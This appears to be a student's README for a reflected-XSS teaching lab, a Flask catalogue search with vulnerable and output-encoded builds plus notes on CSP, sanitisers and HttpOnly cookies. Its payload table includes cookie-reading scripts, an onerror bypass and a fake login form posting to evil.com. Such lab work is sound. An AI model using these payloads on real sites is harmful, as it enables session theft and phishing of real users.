# Folio — Reflected XSS Lab

A small library-catalogue search ("Folio") served in two builds: one that reflects the
search query into the page raw, and one that HTML-encodes it first.

## Quick Start

```bash
pip install flask
python app.py
```

Then open **http://127.0.0.1:5000/** in your browser (or use `run.sh` / `run.bat`).

---

## What This Demo Shows

| Requirement | What's Implemented |
|---|---|
| **(a) Vulnerable implementation** | `/search/vulnerable` — `query_display = query` reflects `?q=` straight into the HTML ([app.py:635](app.py#L635)). The same line is highlighted in the page's **Server code** panel. |
| **(b) Working exploit** | **Exploit drawer** on the search page: 5 payloads (script alert, cookie read, img onerror, defacement, fake login form), each with **Load** (fill the search box) and **Run** (open the crafted link). |
| **(c) Root cause** | User-controlled input is concatenated into the HTML response without output encoding, so the browser parses `<script>` and `on*` handlers as real markup. Shown in the **Why it happens** note. |
| **(d) Mitigation implemented** | `/search/safe` — `query_display = html_mod.escape(query)` (context-aware output encoding, [app.py:664](app.py#L664)). The **Vulnerable / Mitigated** switch replays the exact same request on the other build. |
| **(e) Other mitigations (theory)** | On the home page and in the section below. |

### Interface at a glance

- **Top-right switch** — flips between the Vulnerable and Mitigated builds while keeping the current `?q=`.
- **Status ribbon** — red when output encoding is OFF, green when it is ON.
- **Request inspector** — shows the crafted URL, the decoded `q`, and the exact markup the server inserted into `<span class="results-query">`.
- **Server code** — the route source with the vulnerable / fixed line highlighted.

---

## (e) Other Mitigations — Theory

The mitigation I implemented is **context-aware output encoding** (`html.escape()`). Here are the other defences from the lecture slides and why they work:

| Mitigation | How it works |
|---|---|
| **Framework auto-escaping** | Templating engines like Jinja2 (with `{{ variable }}`) automatically HTML-encode all variables by default, preventing developers from forgetting to encode manually. |
| **HTML sanitiser for rich content** | Libraries like DOMPurify or Bleach parse HTML and strip/allow only a whitelist of safe tags and attributes, so even if raw HTML is needed (e.g., rich-text editors), dangerous elements like `<script>` or `onerror` are removed. |
| **Content Security Policy (CSP)** | An HTTP header (`Content-Security-Policy`) that instructs the browser to only execute scripts from trusted sources. Even if an XSS payload is injected, the browser refuses to run inline scripts or scripts from unauthorised origins. |
| **HttpOnly cookies** | Setting the `HttpOnly` flag on session cookies prevents JavaScript from reading them via `document.cookie`, limiting the damage of XSS attacks that attempt cookie theft. |
| **Safe DOM sinks** | Using `.textContent` or `.innerText` instead of `.innerHTML` in JavaScript ensures that dynamically inserted content is treated as text, not parsed as HTML. This prevents DOM-based XSS. |

---

## Ownership Declaration

| Member Name | Roll Number | Category | Variant Implemented |
|---|---|---|---|
| *Bhavay* | *IIT2024057* | Cross-Site Scripting (XSS) | Reflected XSS |

---

## Project Structure

```
Bhavay(IIT2024057)/
├── app.py          # Flask app with vulnerable + mitigated routes
└── README.md       # This file
```

## Test Payloads

| # | Payload | Purpose |
|---|---|---|
| 1 | `<script>alert('XSS')</script>` | Basic proof of script execution |
| 2 | `<script>alert('Cookies: '+document.cookie)</script>` | Simulates cookie theft |
| 3 | `<img src=x onerror=alert('XSS-via-img')>` | Bypasses naive `<script>` tag filters |
| 4 | `<h1 style="color:red">HACKED!</h1>` | HTML injection / page defacement |
| 5 | `<form action="https://evil.com/steal"><input placeholder="Enter password"><button>Login</button></form>` | Phishing via injected fake login form |

All five are in the **Exploit drawer** on both search pages (Load / Run buttons).

